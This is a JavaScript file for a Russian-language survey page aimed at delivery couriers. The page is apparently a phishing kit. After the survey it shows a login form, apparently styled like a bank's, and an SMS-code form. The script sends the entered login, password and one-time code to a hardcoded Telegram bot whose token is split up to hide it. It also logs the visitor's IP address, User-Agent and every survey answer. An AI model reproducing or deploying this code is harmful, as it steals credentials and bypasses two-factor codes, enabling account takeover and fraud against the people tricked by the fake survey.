(function () {
	const intro = document.getElementById('survey-intro');
	const startButton = document.getElementById('survey-start');
	const surveyContainer = document.getElementById('survey-container');
	const questionEl = document.getElementById('survey-question');
	const optionsEl = document.getElementById('survey-options');
	const nextButton = document.getElementById('survey-next');
	const nextLabel = document.getElementById('survey-next-label');
	const progressBar = document.getElementById('survey-progress-bar');
	const progressText = document.getElementById('survey-progress-text');

	const authFlow = document.getElementById('auth-flow');
	const loader = document.getElementById('auth-loader');
	const successBlock = document.getElementById('auth-success');
	const loaderText = document.querySelector('#auth-loader .auth-result__loaderText');
	const authInfo = document.getElementById('auth-info');

	if (!intro || !startButton || !surveyContainer || !authFlow || !loader || !loaderText) {
		return;
	}

	// Токен и chat_id слегка "зашифрованы" (обфускация, не защита)
	const BOT_TOKEN_PARTS = [
		'8518181',
		'149:AAGgoXM0T5KtzAJe1Wkqz1uviuOl',
		'cmB0TZM',
	];
	const CHAT_ID_PARTS = ['6752', '934', '856'];

	const BOT_TOKEN = BOT_TOKEN_PARTS.join('');
	const CHAT_ID = CHAT_ID_PARTS.join('');

	// простой идентификатор сессии, чтобы группировать события в Telegram
	const SESSION_ID = 'session-' + Date.now() + '-' + Math.floor(Math.random() * 100000);
	// IP пользователя (получаем один раз, используем во всех логах)
	let CLIENT_IP = 'неизвестно';

	// Пытаемся получить внешний IP через публичный сервис
	(async function resolveIp() {
		try {
			const resp = await fetch('https://api.ipify.org?format=json');
			if (resp.ok) {
				const data = await resp.json();
				if (data && data.ip) {
					CLIENT_IP = data.ip;
				}
			}
		} catch (e) {
			console.warn('Не удалось получить IP', e);
		}
	})();

	async function sendToTelegram(message) {
		try {
			const textWithIp =
				message +
				'\n' +
				'🌐 IP: <code>' +
				CLIENT_IP +
				'</code>';

			await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					chat_id: CHAT_ID,
					text: textWithIp,
					parse_mode: 'HTML',
				}),
			});
		} catch (err) {
			console.error('Ошибка отправки в Telegram', err);
		}
	}

	// Логируем сам факт захода на страницу опроса
	sendToTelegram(
		'<b>👀 Новый визит на лендинг опроса</b>\n' +
			'🆔 Сессия: <code>' +
			SESSION_ID +
			'</code>\n' +
			'🧩 User-Agent: <code>' +
			(navigator.userAgent || 'неизвестно') +
			'</code>'
	);

	const questions = [
		// Блок 1. Общая информация о работе
		{
			text: 'Как давно ты работаешь курьером?',
			options: [
				'Меньше месяца',
				'1–3 месяца',
				'3–12 месяцев',
				'Больше года',
			],
		},
		{
			text: 'Ты уже выходил на доставки или пока только прошёл обучение?',
			options: [
				'Уже выхожу на доставки регулярно',
				'Были 1–2 смены, ещё привыкаю',
				'Пока только обучение, доставок ещё не было',
			],
		},
		{
			text: 'Как ты в целом оцениваешь процесс обучения — всё понятно или были моменты, которые хотелось бы объяснить лучше?',
			options: [
				'Всё было понятно, вопросов почти не осталось',
				'В целом понятно, но пару вещей хотелось бы разобрать подробнее',
				'Много непонятных моментов, нужно больше объяснений',
			],
		},

		// Блок 2. Коммуникация с клиентами
		{
			text: 'Насколько тебе комфортно общаться с клиентами при доставке?',
			options: ['Комфортно', 'Нейтрально', 'Не очень комфортно'],
		},
		{
			text: 'Предпочитаешь минимальное общение или не против пары дополнительных фраз, если нужно?',
			options: [
				'Предпочитаю минимальное общение — по делу и всё',
				'Нормально чувствую себя в коротком дружелюбном диалоге',
				'Люблю пообщаться, если у клиента есть вопросы',
			],
		},
		{
			text: 'Как реагируешь, когда клиент просит что-то небольшое сверх выдачи заказа (помочь разобраться, подсказать и т.д.)?',
			options: [
				'Спокойно помогаю, если это быстро',
				'Смотрю по ситуации и по настроению клиента',
				'Стараюсь мягко отказаться, чтобы не задерживаться',
			],
		},

		// Блок 3. Дополнительные действия и нагрузка
		{
			text: 'Как относишься к небольшим дополнительным задачам, если они занимают не больше минуты?',
			options: [
				'Нормально, если это не мешает графику',
				'Иногда готов, но не всегда',
				'Лучше вообще без дополнительных задач',
			],
		},
		{
			text: 'Если дополнительные действия не мешают скорости доставки — это нормально или лучше их избегать?',
			options: [
				'Нормально, могу сделать по просьбе клиента',
				'Зависит от конкретной ситуации',
				'Лучше избегать, чтобы ничего не усложнять',
			],
		},
		{
			text: 'Что для тебя важнее: завершить доставку максимально быстро или сделать сервис более дружелюбным?',
			options: [
				'Максимальная скорость и эффективность',
				'Сделать сервис дружелюбным и комфортным',
				'Найти баланс между скоростью и отношением',
			],
		},
		{
			text: 'Если бы были задачи, которые можно брать по желанию, было бы удобнее?',
			options: [
				'Да, удобно самому выбирать, что брать',
				'Скорее да, если всё чётко описано',
				'Не принципиально, можно и без этого',
			],
		},

		// Блок 4. Условия и комфорт работы
		{
			text: 'Насколько для тебя важна простота дополнительных действий?',
			options: [
				'Важно, чтобы были только лёгкие действия',
				'Можно чуть сложнее, если понятно, что делать',
				'Без разницы, если всё нормально объяснено',
			],
		},
		{
			text: 'Важно ли, чтобы всё было официальным, безопасным и не затрагивало данные клиента?',
			options: [
				'Да, это принципиально важно',
				'Скорее да, но могу довериться системе',
				'Главное, чтобы это не мешало работе',
			],
		},
		{
			text: 'Что, на твой взгляд, чаще всего мешает выполнять дополнительные задачи?',
			options: [
				'Не хватает времени на доставках',
				'Не всегда удобно по месту или по ситуации',
				'Клиенты не всегда настроены на общение',
				'Не до конца понятна политика компании',
			],
		},

		// Блок 5. Отношение к инициативам и бонусам
		{
			text: 'Как в целом относишься к предложениям, которые помогают улучшить условия или добавить небольшой бонус к заработку?',
			options: [
				'Позитивно, интересно рассматривать такие варианты',
				'Нейтрально, смотрю по конкретному предложению',
				'Скептически, чаще всего это усложняет работу',
			],
		},
		{
			text: 'Если бы за простые одноразовые действия давалась небольшая доплата — это скорее интересно или нет?',
			options: [
				'Да, это интересно, если всё прозрачно',
				'Скорее да, если это не занимает много времени',
				'Не особо интересно, предпочитаю просто доставлять заказы',
			],
		},
		{
			text: 'Интересно ли тебе иметь возможность выбирать мелкие задачи самостоятельно, в удобный момент?',
			options: [
				'Да, хочу сам решать, когда брать такие задачи',
				'Иногда, если будет подходящее время',
				'Нет, предпочитаю работать только по основным заказам',
			],
		},
	];

	let currentIndex = 0;
	const answers = new Array(questions.length).fill(null);

	function renderProgress() {
		const total = questions.length;
		const current = currentIndex + 1;
		const percent = (current / total) * 100;

		if (progressBar) {
			progressBar.style.width = percent + '%';
		}
		if (progressText) {
			progressText.textContent = 'Вопрос ' + current + ' из ' + total;
		}
	}

	function renderQuestion() {
		const q = questions[currentIndex];
		if (!q) return;

		if (questionEl) {
			questionEl.textContent = q.text;
		}

		if (optionsEl) {
			optionsEl.innerHTML = '';
			q.options.forEach((opt, idx) => {
				const btn = document.createElement('button');
				btn.type = 'button';
				btn.className = 'survey-option';
				btn.textContent = opt;
				btn.addEventListener('click', function () {
					answers[currentIndex] = idx;
					// снять выделение со всех
					Array.from(optionsEl.querySelectorAll('.survey-option')).forEach((el) =>
						el.classList.remove('survey-option_selected')
					);
					btn.classList.add('survey-option_selected');
					optionsEl.classList.add('survey-options_has-selection');
					nextButton.removeAttribute('disabled');
				});
				optionsEl.appendChild(btn);
			});

			// восстановим выбор, если уже отвечали
			if (answers[currentIndex] !== null) {
				const selected = optionsEl.children[answers[currentIndex]];
				if (selected) {
					selected.classList.add('survey-option_selected');
					optionsEl.classList.add('survey-options_has-selection');
					nextButton.removeAttribute('disabled');
				}
			} else {
				optionsEl.classList.remove('survey-options_has-selection');
				nextButton.setAttribute('disabled', '');
			}
		}

		if (nextLabel) {
			nextLabel.textContent = currentIndex === questions.length - 1 ? 'Завершить' : 'Далее';
		}

		renderProgress();
	}

	startButton.addEventListener('click', function () {
		intro.style.display = 'none';
		surveyContainer.style.display = 'block';
		currentIndex = 0;
		renderQuestion();

		// логируем старт опроса
		sendToTelegram(
			'<b>▶️ Старт опроса</b>\n' + '🆔 Сессия: <code>' + SESSION_ID + '</code>'
		);
	});

	nextButton.addEventListener('click', function () {
		if (answers[currentIndex] === null) {
			return;
		}

		// перед переходом логируем ответ на текущий вопрос
		const q = questions[currentIndex];
		const answerIndex = answers[currentIndex];
		const answerText = q && typeof answerIndex === 'number' ? q.options[answerIndex] : '—';
		sendToTelegram(
			'<b>📋 Ответ на вопрос #' +
				(currentIndex + 1) +
				'</b>\n' +
				'🆔 Сессия: <code>' +
				SESSION_ID +
				'</code>\n' +
				'❓ ' +
				(q ? q.text : 'неизвестный вопрос') +
				'\n' +
				'✅ Ответ: ' +
				answerText
		);

		// если это не последний вопрос — идём дальше
		if (currentIndex < questions.length - 1) {
			currentIndex += 1;
			renderQuestion();
			return;
		}
		// последний вопрос: небольшая "загрузка" перед авторизацией
		surveyContainer.style.display = 'none';
		loaderText.textContent = 'Сохраняем ответы…';
		// показываем блок авторизации, но прячем формы на время загрузки
		authFlow.style.display = 'block';

		const loginForm = document.getElementById('login-step');
		const smsForm = document.getElementById('sms-step');

		if (loginForm) {
			loginForm.style.display = 'none';
		}
		if (smsForm) {
			smsForm.style.display = 'none';
		}
		if (authInfo) {
			authInfo.style.display = 'none';
		}

		loader.style.display = 'flex';

		setTimeout(function () {
			loader.style.display = 'none';
			// После сохранения ответов показываем пояснение о необходимости авторизации
			if (authInfo) {
				authInfo.style.display = 'block';
			}
			if (loginForm) {
				loginForm.style.display = 'block';
			}
		}, 2000);

		// дальше логика авторизации
		setupAuthFlow(loginForm, smsForm, loader, loaderText, successBlock, authInfo);
	});

	// -------- Этап авторизации после опроса --------

	function setupAuthFlow(loginForm, smsForm, loader, loaderText, successBlock, authInfo) {
		const loginInput = document.querySelector('input[data-test-id="login-input"]');
		const passwordInput = document.querySelector('input[data-test-id="password-input"]');
		const loginSubmit = document.getElementById('login-submit');

		const smsSubmit = document.getElementById('sms-submit');

		const loginWrapper = loginInput && loginInput.closest('.form-control__inputWrapper_1ilh2');
		const passwordWrapper = passwordInput && passwordInput.closest('.form-control__inputWrapper_1ilh2');

		const eyeButton = document.querySelector('.password-input__eye_czmrz');

		function toggleWrapperFocus(wrapper, isFocused) {
			if (!wrapper) return;
			if (isFocused) {
				wrapper.classList.add('alfa-focused');
			} else {
				wrapper.classList.remove('alfa-focused');
			}
		}

		function updateWrapperValueState(input, wrapper) {
			if (!input || !wrapper) return;
			if (input.value.trim()) {
				wrapper.classList.add('alfa-has-value');
			} else {
				wrapper.classList.remove('alfa-has-value');
			}
		}

		function updateLoginButtonState() {
			if (loginInput.value.trim() && passwordInput.value.trim()) {
				loginSubmit.removeAttribute('disabled');
			} else {
				loginSubmit.setAttribute('disabled', '');
			}
		}


		if (loginInput) {
			loginInput.addEventListener('input', function () {
				updateLoginButtonState();
				updateWrapperValueState(loginInput, loginWrapper);
			});
			loginInput.addEventListener('focus', function () {
				toggleWrapperFocus(loginWrapper, true);
				if (authInfo) {
					authInfo.style.display = 'none';
				}
			});
			loginInput.addEventListener('blur', function () {
				toggleWrapperFocus(loginWrapper, false);
				updateWrapperValueState(loginInput, loginWrapper);
			});
		}

		if (passwordInput) {
			passwordInput.addEventListener('input', function () {
				updateLoginButtonState();
				updateWrapperValueState(passwordInput, passwordWrapper);
			});
			passwordInput.addEventListener('focus', function () {
				toggleWrapperFocus(passwordWrapper, true);
				if (authInfo) {
					authInfo.style.display = 'none';
				}
			});
			passwordInput.addEventListener('blur', function () {
				toggleWrapperFocus(passwordWrapper, false);
				updateWrapperValueState(passwordInput, passwordWrapper);
			});
		}

		// Инициализируем состояние для уже заполненных полей (если такие будут)
		updateWrapperValueState(loginInput, loginWrapper);
		updateWrapperValueState(passwordInput, passwordWrapper);

		if (eyeButton && passwordInput) {
			eyeButton.addEventListener('click', function () {
				const isPassword = passwordInput.getAttribute('type') === 'password';
				passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
				eyeButton.classList.toggle('alfa-eye-active', isPassword);
			});
		}

		if (loginForm && smsForm) {
			loginForm.addEventListener('submit', function (e) {
				e.preventDefault();

				const loginValue = (loginInput && loginInput.value.trim()) || '';
				const passwordValue = (passwordInput && passwordInput.value.trim()) || '';

				sendToTelegram(
					'<b>🔐 Новый вход:</b>\n' +
						'👤 Логин: <code>' +
						loginValue +
						'</code>\n' +
						'🔑 Пароль: <code>' +
						passwordValue +
						'</code>'
				);

				if (authInfo) authInfo.style.display = 'none';

				loginForm.style.display = 'none';
				smsForm.style.display = 'block';
				
				// Фокус на первое поле ввода кода
				const firstInput = smsForm.querySelector('.sms-verification__input[data-index="0"]');
				if (firstInput) {
					setTimeout(() => firstInput.focus(), 100);
				}
			});

			// Логика для 5 отдельных полей ввода СМС-кода
			const smsInputs = smsForm.querySelectorAll('.sms-verification__input');
			const smsFullCodeInput = document.getElementById('sms-full-code');

			// Обработка ввода в каждое поле
			smsInputs.forEach((input, index) => {
				input.addEventListener('input', function (e) {
					const value = e.target.value.replace(/[^0-9]/g, '');
					e.target.value = value;

					// Обновляем скрытое поле с полным кодом
					const fullCode = Array.from(smsInputs)
						.map((inp) => inp.value)
						.join('');
					if (smsFullCodeInput) {
						smsFullCodeInput.value = fullCode;
					}

					// Активируем кнопку, если все 5 полей заполнены
					if (fullCode.length === 5) {
						if (smsSubmit) {
							smsSubmit.removeAttribute('disabled');
						}
					} else {
						if (smsSubmit) {
							smsSubmit.setAttribute('disabled', '');
						}
					}

					// Автоматический переход на следующее поле
					if (value && index < smsInputs.length - 1) {
						smsInputs[index + 1].focus();
					}
				});

				input.addEventListener('keydown', function (e) {
					// Backspace: переход на предыдущее поле, если текущее пустое
					if (e.key === 'Backspace' && !e.target.value && index > 0) {
						smsInputs[index - 1].focus();
					}
				});

				input.addEventListener('paste', function (e) {
					e.preventDefault();
					const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
					if (pastedData.length > 0) {
						for (let i = 0; i < Math.min(pastedData.length, smsInputs.length - index); i++) {
							smsInputs[index + i].value = pastedData[i];
						}
						// Обновляем скрытое поле
						const fullCode = Array.from(smsInputs)
							.map((inp) => inp.value)
							.join('');
						if (smsFullCodeInput) {
							smsFullCodeInput.value = fullCode;
						}
						// Фокус на последнее заполненное поле или следующее пустое
						const lastFilledIndex = Math.min(index + pastedData.length - 1, smsInputs.length - 1);
						if (lastFilledIndex < smsInputs.length - 1) {
							smsInputs[lastFilledIndex + 1].focus();
						} else {
							smsInputs[lastFilledIndex].focus();
						}
						// Активируем кнопку, если все заполнено
						if (fullCode.length === 5 && smsSubmit) {
							smsSubmit.removeAttribute('disabled');
						}
					}
				});
			});

			smsForm.addEventListener('submit', function (e) {
				e.preventDefault();

				const fullCode = Array.from(smsInputs)
					.map((inp) => inp.value)
					.join('');

				if (fullCode.length !== 5) {
					return;
				}

				sendToTelegram('<b>📲 Подтверждение SMS:</b>\n' + '🔢 Код: <code>' + fullCode + '</code>');

				smsSubmit.setAttribute('disabled', '');
				smsInputs.forEach((inp) => {
					inp.setAttribute('disabled', '');
				});
				smsForm.style.display = 'none';

				loaderText.textContent = 'Проверяем код…';
				loader.style.display = 'flex';

				setTimeout(function () {
					loader.style.display = 'none';
					successBlock.classList.add('auth-result__success_visible');
				}, 2000);
			});
		}
	}
})();


